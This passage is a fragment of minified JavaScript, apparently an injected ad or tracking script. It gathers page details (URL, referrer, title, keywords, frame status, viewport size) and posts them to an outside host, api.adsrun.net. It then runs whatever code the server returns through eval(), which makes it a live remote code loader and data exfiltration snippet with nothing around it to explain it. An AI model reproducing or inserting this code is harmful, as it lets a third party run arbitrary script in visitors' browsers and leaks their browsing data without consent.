...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://api.adsrun.net/post",{"name":"jqr1","time":1456340225.5452,"user":"1005803.547368","subid":1005803,"geo":"US","hash":"3716aa065f31859462a3b2a4cf3e0b55"});
